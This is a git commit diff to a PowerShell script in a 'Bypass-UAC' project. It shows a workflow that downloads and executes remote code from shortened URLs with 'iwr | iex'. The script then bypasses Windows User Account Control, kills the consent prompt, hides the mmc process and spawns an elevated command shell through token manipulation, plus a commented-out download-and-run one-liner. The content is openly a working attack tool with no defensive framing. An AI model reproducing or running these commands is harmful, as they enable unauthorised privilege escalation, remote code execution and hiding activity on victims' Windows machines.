9e282446be0fcbaa0229e29c0f0df50294e50ba3
Az <z0rk@protonmail.com>
2017-12-01 14:32:12 +0100

    Update two.ps1

--- Bypass-UAC/two.ps1
+++ Bypass-UAC/two.ps1
@@ -2,7 +2,7 @@ workflow Test-Workflow
 {
     Parallel
     {
-        iwr https://goo.gl/x6ZcHM | iex "&" Bypass-UAC -Method UacMethodNetOle32
+        iwr https://goo.gl/x6ZcHM | iex; Bypass-UAC -Method UacMethodNetOle32
         iwr https://goo.gl/zggqse | iex; kill-window consent #sendKey kill to consent
         iwr https://goo.gl/zggqse | iex; hide-process mmc #hide mmc
         iwr https://goo.gl/wxJHHq | iex; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id # PROMPT ADMIN CMD AHAHAH :D #-Args "/c powershell -C iwr goo.gl/ | iex"-ProcPID (ps -Name mmc).id
